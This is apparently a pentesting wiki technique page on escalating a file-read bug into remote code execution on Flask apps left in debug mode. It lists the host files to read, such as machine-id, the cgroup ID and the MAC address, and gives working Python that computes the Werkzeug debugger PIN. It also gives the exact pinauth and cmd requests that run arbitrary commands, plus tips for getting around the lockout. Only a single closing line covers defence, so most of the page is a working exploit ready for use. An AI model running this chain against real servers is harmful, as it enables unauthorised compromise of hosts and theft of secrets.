---
title: "Werkzeug / Flask Debug Console RCE (PIN bypass)"
type: technique
tags: [web, flask, werkzeug, rce, debug, pin, lfi]
phase: exploitation
date_created: 2026-07-20
date_updated: 2026-07-20
sources: []
---

# Werkzeug / Flask Debug Console RCE (PIN bypass)

A Flask app run with `debug=True` exposes the Werkzeug interactive debugger at `/console` (and on every
traceback). The console gives arbitrary Python execution, gated by a numeric PIN. If you can read a few
predictable files from the host (via LFI/SSRF/path-traversal), the PIN is fully computable, turning a
file-read into RCE.

## Detect

- `Server: Werkzeug/x.y.z Python/a.b.c` header; a traceback page titled "... // Werkzeug Debugger";
  or `/console` returning a page with `CONSOLE_MODE`, `EVALEX = true`, "The console is locked".
- Trigger any exception (bad type/param) - in debug mode it returns an interactive traceback whose
  frames each have a console and whose local variables are dumped (often leaking secrets/creds).

## Compute the PIN (needs a file-read primitive: LFI / SSRF `file://` / path traversal)

The PIN = a hash over "public" bits (guessable) + "private" bits (host files). Read the private bits:

| Input | Source file | Note |
|---|---|---|
| username | `getpass.getuser()` | usually from `/etc/passwd` by uid; Docker apps are commonly **root** |
| modname | constant `flask.app` | for a Flask app |
| appname | constant `Flask` | `type(app).__name__` |
| app file | `/usr/local/lib/python3.X/site-packages/flask/app.py` | leaked in any traceback |
| MAC (as int) | `/sys/class/net/eth0/address` | `uuid.getnode()` = `int(mac.replace(':',''),16)` |
| machine-id | `/etc/machine-id` **or** `/proc/sys/kernel/random/boot_id`, **plus** the last path segment of the first line of `/proc/self/cgroup` | see gotcha below |

```python
import hashlib
from itertools import chain
pub = ['root', 'flask.app', 'Flask', '/usr/local/lib/python3.10/site-packages/flask/app.py']
mac = str(int('0242ac140002', 16))               # from /sys/class/net/eth0/address
machine_id = '<machine-id-or-boot_id>' + '<cgroup-container-id>'
h = hashlib.md5()                                 # Werkzeug < 2.0 = md5; >= 2.0 = sha1
for b in chain(pub, [mac, machine_id]):
    if b: h.update(b.encode())
h.update(b'cookiesalt'); cookie = '__wzd' + h.hexdigest()[:20]
h.update(b'pinsalt'); num = ('%09d' % int(h.hexdigest(),16))[:9]
pin = '-'.join(num[i:i+3] for i in range(0,9,3))
```

**Gotchas that cost time (brute these variants - each is one pinauth request; ~10 fail-lockout):**
- **hash:** Werkzeug **< 2.0 uses md5**, **>= 2.0 uses sha1** (check the `Server` header version).
- **machine-id assembly:** `get_machine_id` reads `/etc/machine-id` then `/proc/sys/kernel/random/boot_id`
  (first non-empty wins), then appends the cgroup container id. In some containers BOTH machine-id and
  boot_id are empty/unreadable, so **machine_id = the cgroup container id ONLY** (this was the live case).
  Try: `boot_id+cgroup`, `machine-id+cgroup`, `boot_id` alone, `cgroup` alone.
- username is whatever the process runs as (`/proc/self/status` Uid -> `/etc/passwd`); Docker = often root.

## Unlock + execute

```python
# GET /console page -> extract SECRET = "...."; then:
GET /console?__debugger__=yes&cmd=pinauth&pin=<PIN>&s=<SECRET>     # -> {"auth": true}  (sets __wzd... cookie)
GET /console?__debugger__=yes&cmd=<python>&frm=0&s=<SECRET>        # with the cookie -> executes, returns repr
# e.g. cmd = import os;print(os.listdir('/usr/src/app'))   or   subprocess.check_output('id',shell=True)
```

Defence: never ship `debug=True`/`use_reloader` to anything reachable; set `WERKZEUG_DEBUG_PIN=off` only
for throwaway labs. Related: [[ssrf]] (the file-read that feeds the PIN), [[insecure-randomness]].

<!-- promoted-slug: werkzeug-pin-rce-body -->
